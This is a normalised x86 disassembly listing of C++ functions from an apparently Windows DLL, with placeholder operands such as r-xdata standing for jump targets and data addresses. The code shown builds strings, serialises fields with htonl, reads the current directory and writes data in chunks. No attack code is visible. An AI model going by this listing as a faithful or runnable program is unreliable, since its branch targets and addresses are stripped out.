mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
mov [ ecx ] eax
sub_10019cc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b2c9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
add ecx 0xc
mov esi [ ebp + 0x8 ]
push 0xffffffff
push 0x0
push ecx
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10019d30
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b2c9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
add ecx 0x28
mov esi [ ebp + 0x8 ]
push 0xffffffff
push 0x0
push ecx
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10019da0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004e963
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov ecx esi
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call eax
cmp al 0xa
je r-xdata
mov eax [ esi ]
mov ecx esi
push 0x8000000a
call [ eax + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax ]
call eax
cmp al 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
mov ecx esi
push 0x8000010a
call [ eax + 0x8 ]
mov [ esp + 0x38 ] 0x0
mov esi eax
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x68 ] 0x0
lea eax [ esp + 0x12 ]
push 0x1
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x1a ] 0xa
call sub_10005470
push 0x1
lea eax [ esp + 0x15 ]
mov [ esp + 0x15 ] 0x1
push eax
lea ecx [ esp + 0x30 ]
call sub_10005470
push [ esi + 0x4 ]
mov edi [ htonl@IAT ]
call edi
mov [ esp + 0x20 ] eax
lea ecx [ esp + 0x28 ]
push 0x4
lea eax [ esp + 0x24 ]
push eax
call sub_10005470
push [ esi + 0x8 ]
call edi
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x28 ]
push 0x4
lea eax [ esp + 0x18 ]
push eax
call sub_10005470
lea eax [ esp + 0x40 ]
mov ecx esi
push eax
call sub_10019d30
mov [ esp + 0x68 ] 0x1
push [ eax + 0x10 ]
call edi
mov [ esp + 0x1c ] eax
mov [ esp + 0x68 ] 0x0
cmp [ esp + 0x54 ] 0x10
jb r-xdata
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x4c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push 0x4
lea eax [ esp + 0x20 ]
mov [ esp + 0x58 ] 0xf
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] 0x0
call sub_10005470
lea eax [ esp + 0x40 ]
mov ecx esi
push eax
call sub_10019d30
mov [ esp + 0x68 ] 0x2
lea ecx [ esp + 0x28 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x68 ] 0x0
cmp [ esp + 0x54 ] 0x10
jb r-xdata
push [ esp + 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
lea eax [ esp + 0x40 ]
mov [ esp + 0x54 ] 0xf
push eax
mov ecx esi
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x44 ] 0x0
call sub_10019cc0
mov [ esp + 0x68 ] 0x3
push [ eax + 0x10 ]
call edi
mov [ esp + 0x18 ] eax
mov [ esp + 0x68 ] 0x0
cmp [ esp + 0x54 ] 0x10
jb r-xdata
push [ esp + 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x4
lea eax [ esp + 0x1c ]
mov [ esp + 0x58 ] 0xf
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] 0x0
call sub_10005470
lea eax [ esp + 0x40 ]
mov ecx esi
push eax
call sub_10019cc0
mov [ esp + 0x68 ] 0x4
lea ecx [ esp + 0x28 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x68 ] 0x0
cmp [ esp + 0x54 ] 0x10
jb r-xdata
push [ esp + 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ esi + 0x24 ]
lea ecx [ esp + 0x28 ]
mov [ esp + 0x13 ] al
lea eax [ esp + 0x13 ]
push 0x1
push eax
mov [ esp + 0x5c ] 0xf
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] 0x0
call sub_10005470
push 0x18
call sub_1003cdeb
add esp 0x4
mov [ esp + 0x24 ] eax
mov [ esp + 0x68 ] 0x5
test eax eax
je r-xdata
push [ esp + 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
xor esi esi
push [ esp + 0x38 ]
mov ecx eax
call sub_10037bc0
mov esi eax
jmp r-xdata
mov [ esp + 0x3c ] 0xf
mov eax esi
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
push [ esp + 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x68 ] 0x0
lea ecx [ esp + 0x28 ]
cmp [ esp + 0x3c ] 0x10
push [ esp + 0x38 ]
cmovae ecx [ esp + 0x2c ]
mov eax [ esi ]
push ecx
push 0x0
mov ecx esi
call [ eax + 0x10 ]
mov [ esp + 0x68 ] 0xffffffff
cmp [ esp + 0x3c ] 0x10
jb r-xdata
sub_1001a0a0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1001a0d0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001a0d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e9b3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov [ ebp - 0x10 ] eax
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ eax + 0x4 ]
mov edi [ ebx ]
mov esi [ edi ]
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx ]
mov ecx [ eax ]
mov [ eax ] eax
mov eax [ ebx ]
mov [ eax + 0x4 ] eax
mov [ ebx + 0x4 ] 0x0
cmp ecx [ ebx ]
je r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebx ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esp [ esp ]
mov esi [ esi ]
cmp esi edi
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov esi [ ecx ]
push ecx
call j_sub_1003f3e3#2
add esp 0x4
mov ecx esi
cmp esi [ ebx ]
jne r-xdata
sub_1001a1a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ecx + 0x4 ]
mov esi [ edi ]
cmp esi edi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov esi [ esi ]
cmp esi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
push ebx
mov eax [ ecx ]
call [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_1001a1d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e9e0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
mov edi [ ecx + 0x4 ]
mov esi [ edi ]
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push [ ebp + 0x20 ]
mov ebx [ esi + 0x8 ]
lea eax [ ebp + 0x8 ]
sub esp 0x18
mov ecx esp
mov [ ebp - 0x10 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx ]
mov [ ebp - 0x4 ] 0x0
mov ecx ebx
call [ eax + 0x8 ]
mov esi [ esi ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001a290
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b2c9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
add ecx 0x34
mov esi [ ebp + 0x8 ]
push 0xffffffff
push 0x0
push ecx
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1001a300
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b2c9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
add ecx 0x4c
mov esi [ ebp + 0x8 ]
push 0xffffffff
push 0x0
push ecx
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1001a370
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b2c9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
add ecx 0x64
mov esi [ ebp + 0x8 ]
push 0xffffffff
push 0x0
push ecx
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1001a3e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b2c9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
add ecx 0x1c
mov esi [ ebp + 0x8 ]
push 0xffffffff
push 0x0
push ecx
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1001a470
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004ea18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
push 0x8000000d
mov eax [ ecx ]
call [ eax + 0x8 ]
mov esi eax
mov [ esp + 0x14 ] esi
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
xor ebx ebx
mov edx [ ecx ]
call [ edx + 0xc ]
mov ebx eax
jmp r-xdata
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x70 ] 0x0
cmp [ esp + 0x44 ] 0x10
jb r-xdata
push [ esp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
lea eax [ esp + 0x48 ]
mov ecx esi
push eax
call sub_1001a300
mov edi eax
mov [ esp + 0x70 ] 0x0
lea eax [ esp + 0x30 ]
push eax
mov ecx esi
call sub_1001a290
mov esi eax
mov [ esp + 0x70 ] 0x1
lea eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push eax
call sub_1001a3e0
mov [ esp + 0x70 ] 0x2
mov ecx [ esi + 0x10 ]
mov esi [ eax + 0x10 ]
add esi ecx
add esi [ edi + 0x10 ]
mov [ esp + 0x70 ] 0x1
cmp [ esp + 0x2c ] 0x10
jb r-xdata
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x70 ] 0xffffffff
cmp [ esp + 0x5c ] 0x10
jb r-xdata
push [ esp + 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
lea eax [ esi + 0x10 ]
mov [ esp + 0x5c ] 0xf
mov [ esp + 0x58 ] 0x0
add eax ebx
mov [ esp + 0x48 ] 0x0
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001a5d0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004ea6c
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x106c
call sub_10048ab0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1068 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1080 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
push 0x8000000d
mov eax [ ecx ]
call [ eax + 0x8 ]
mov esi [ edi ]
mov ebx eax
mov ecx [ ebx ]
mov ecx [ ecx + 0x8 ]
add ecx ebx
mov edx [ ecx ]
mov edx [ edx ]
call edx
push edx
push eax
mov ecx edi
call [ esi + 0x14 ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
push 0x1
call [ eax + 0x8 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
mov ecx edi
push [ ebx + 0x10 ]
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x1080 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1068 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
lea eax [ esp + 0x14 ]
mov ecx ebx
push eax
call sub_1001a290
mov [ esp + 0x1088 ] 0x0
mov ecx edi
mov eax [ edi ]
push [ esp + 0x24 ]
call [ eax + 0x10 ]
test eax eax
je r-xdata
xor esi esi
cmp [ esp + 0x28 ] 0x10
lea ecx [ esp + 0x14 ]
mov esi [ esp + 0x24 ]
cmovae ecx [ esp + 0x14 ]
mov eax [ edi ]
push esi
push ecx
mov ecx edi
call [ eax + 0x4 ]
cmp esi eax
jne r-xdata
mov [ esp + 0x28 ] 0xf
mov eax esi
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
push [ esp + 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ edi ]
mov ecx edi
push [ ebx + 0x14 ]
call [ eax + 0x10 ]
test eax eax
je r-xdata
lea eax [ esp + 0x44 ]
mov ecx ebx
push eax
call sub_1001a300
mov [ esp + 0x1088 ] 0x1
mov ecx edi
mov eax [ edi ]
push [ esp + 0x54 ]
call [ eax + 0x10 ]
test eax eax
je r-xdata
xor esi esi
mov [ esp + 0x1088 ] 0x0
lea ecx [ esp + 0x44 ]
call sub_10001880
jmp r-xdata
cmp [ esp + 0x58 ] 0x10
lea ecx [ esp + 0x44 ]
mov esi [ esp + 0x54 ]
cmovae ecx [ esp + 0x44 ]
mov eax [ edi ]
push esi
push ecx
mov ecx edi
call [ eax + 0x4 ]
cmp esi eax
jne r-xdata
mov [ esp + 0x1088 ] 0xffffffff
cmp [ esp + 0x28 ] 0x10
jb r-xdata
lea eax [ esp + 0x5c ]
mov ecx ebx
push eax
call sub_1001a370
mov [ esp + 0x1088 ] 0x2
mov ecx edi
mov eax [ edi ]
push [ esp + 0x6c ]
call [ eax + 0x10 ]
test eax eax
je r-xdata
xor esi esi
mov [ esp + 0x1088 ] 0x1
lea ecx [ esp + 0x5c ]
call sub_10001880
mov [ esp + 0x1088 ] 0x0
lea ecx [ esp + 0x44 ]
call sub_10001880
jmp r-xdata
cmp [ esp + 0x70 ] 0x10
lea ecx [ esp + 0x5c ]
mov esi [ esp + 0x6c ]
cmovae ecx [ esp + 0x5c ]
mov eax [ edi ]
push esi
push ecx
mov ecx edi
call [ eax + 0x4 ]
cmp esi eax
jne r-xdata
lea eax [ esp + 0x2c ]
mov ecx ebx
push eax
call sub_1001a3e0
mov [ esp + 0x1088 ] 0x3
mov ecx edi
mov eax [ edi ]
push [ esp + 0x3c ]
call [ eax + 0x10 ]
test eax eax
je r-xdata
xor esi esi
mov [ esp + 0x1088 ] 0x2
lea ecx [ esp + 0x2c ]
call sub_10001880
mov [ esp + 0x1088 ] 0x1
lea ecx [ esp + 0x5c ]
call sub_10001880
mov [ esp + 0x1088 ] 0x0
lea ecx [ esp + 0x44 ]
call sub_10001880
jmp r-xdata
cmp [ esp + 0x40 ] 0x10
lea ecx [ esp + 0x2c ]
mov esi [ esp + 0x3c ]
cmovae ecx [ esp + 0x2c ]
mov eax [ edi ]
push esi
push ecx
mov ecx edi
call [ eax + 0x4 ]
cmp esi eax
jne r-xdata
mov ebx [ ebx + 0x18 ]
test ebx ebx
je r-xdata
mov eax [ edi ]
mov ecx edi
push 0x0
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov ecx ebx
mov esi [ edi ]
call [ eax + 0xc ]
push eax
mov ecx edi
call [ esi + 0x10 ]
test eax eax
je r-xdata
mov esi 0x1
mov [ esp + 0x1088 ] 0x2
lea ecx [ esp + 0x2c ]
call sub_10001880
mov [ esp + 0x1088 ] 0x1
lea ecx [ esp + 0x5c ]
call sub_10001880
mov [ esp + 0x1088 ] 0x0
lea ecx [ esp + 0x44 ]
call sub_10001880
jmp r-xdata
mov eax [ ebx ]
xor esi esi
mov ecx ebx
mov [ esp + 0x10 ] esi
call [ eax + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebx ]
lea ecx [ esp + 0x74 ]
push 0x1000
push ecx
push esi
mov ecx ebx
call [ eax + 0x14 ]
mov esi eax
test esi esi
je r-xdata
mov edx [ edi ]
lea eax [ esp + 0x74 ]
push esi
push eax
mov ecx edi
call [ edx + 0x4 ]
cmp esi eax
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
add [ esp + 0x10 ] esi
call [ eax + 0xc ]
mov esi [ esp + 0x10 ]
cmp esi eax
jb r-xdata
mov esi 0x1
mov [ esp + 0x1088 ] 0x2
lea ecx [ esp + 0x2c ]
call sub_10001880
mov [ esp + 0x1088 ] 0x1
lea ecx [ esp + 0x5c ]
call sub_10001880
mov [ esp + 0x1088 ] 0x0
lea ecx [ esp + 0x44 ]
call sub_10001880
jmp r-xdata
sub_1001a990
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001a9d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004eaa8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
add ecx 0x4
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001aa70
push ebp
mov ebp esp
push 0xffffffff
push sub_1004dbf9
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov edx [ ecx + 0x68 ]
mov [ eax + 0x8 ] edx
mov ecx [ ecx + 0x6c ]
mov [ eax + 0xc ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_1001ae10
push ebp
mov ebp esp
push 0xffffffff
push sub_1004ee3d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x348
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x320 ] ebx
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ebx ] r--data
mov [ ebp - 0x4 ] 0x1
lea esi [ ebx + 0x4 ]
mov [ ebx ] r--data
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebx + 0x24 ]
push ecx
mov [ ebp - 0x2f0 ] ecx
mov [ ebp - 0x2fc ] ecx
call sub_1001c850
mov [ ebp - 0x4 ] 0x5
lea edi [ ebx + 0x40 ]
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
mov [ ebp - 0x4 ] 0x6
mov [ ebx + 0x60 ] r--data
mov [ ebx + 0x68 ] 0x0
mov [ ebx + 0x6c ] 0x0
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x354 ]
mov [ ebx + 0x3c ] 0x0
mov [ ebx + 0x38 ] 0x0
call sub_1003ba00
mov ecx eax
mov [ ebp - 0x4 ] 0x8
mov eax [ ecx + 0x8 ]
mov [ ebx + 0x68 ] eax
mov eax [ ecx + 0xc ]
mov [ ebx + 0x6c ] eax
mov [ ebp - 0x4 ] 0x7
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x354 ] r--data
cmp edi eax
je r-xdata
cmp [ ebx + 0x50 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x58 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x5c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x70 ] eax
jbe r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_100018b0
push 0x26c
lea eax [ ebp - 0x284 ]
push 0x0
push eax
call sub_10045ec0
add esp 0xc
lea eax [ ebp - 0x284 ]
push eax
push 0x135
call [ GetCurrentDirectoryW@IAT ]
test eax eax
je r-xdata
mov [ ebx + 0x3c ] 0x71
call sub_100070d0
mov [ ebx + 0x38 ] eax
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x30c ] 0x0
mov [ ebp - 0x308 ] 0x0
mov [ ebp - 0x308 ] 0x7
mov [ ebp - 0x30c ] 0x0
mov [ ebp - 0x31c ] ax
cmp [ ebp - 0x284 ] ax
jne r-xdata
mov [ ebx + 0x3c ] 0x70
call sub_10007010
mov [ ebx + 0x38 ] eax
test eax eax
jne r-xdata
mov edi [ rw-data ]
sub esp 0x18
mov edx esp
mov [ ebp - 0x2f0 ] esp
mov [ edx + 0x14 ] 0xf
mov [ edx + 0x10 ] 0x0
mov [ edx ] 0x0
cmp [ edi ] 0x0
jne r-xdata
mov ecx 0x55
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
lea ecx [ ebp - 0x284 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov [ ebx + 0x3c ] al
mov ecx edi
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x2f4 ] eax
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x284 ]
push eax
lea ecx [ ebp - 0x31c ]
call sub_10009730
mov [ ebp - 0x4 ] 0x9
lea eax [ ebp - 0x31c ]
cmp esi eax
je r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx [ ebp - 0x2f4 ]
push ecx
push edi
mov ecx edx
call sub_100019e0
mov [ ebp - 0x4 ] 0xa
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x33c ]
call sub_1003c0f0
add esp 0x18
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x33c ]
cmp esi eax
je r-xdata
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x308 ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_10003a20
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x328 ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_10003a20
xor eax eax
mov [ ebp - 0x308 ] 0x7
mov [ ebp - 0x30c ] 0x0
mov [ ebp - 0x31c ] ax
jmp r-xdata
push [ ebp - 0x31c ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x328 ] 0x7
mov [ ebp - 0x32c ] 0x0
mov [ ebp - 0x33c ] ax
push [ ebp - 0x33c ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x20
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
mov [ ebp - 0x4 ] 0xc
test eax eax
je r-xdata
xor eax eax
push ecx
mov ecx eax
call sub_100246b0
jmp r-xdata
xor edi edi
push ecx
mov ecx eax
call sub_10023a60
mov edi eax
jmp r-xdata
mov [ ebp - 0x2f8 ] eax
mov [ ebp - 0x4 ] 0x7
push 0x30
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
mov [ ebp - 0x4 ] 0xd
test eax eax
je r-xdata
mov [ ebp - 0x2ec ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0xe
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0xf
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2ec ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x7
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2e8 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x10
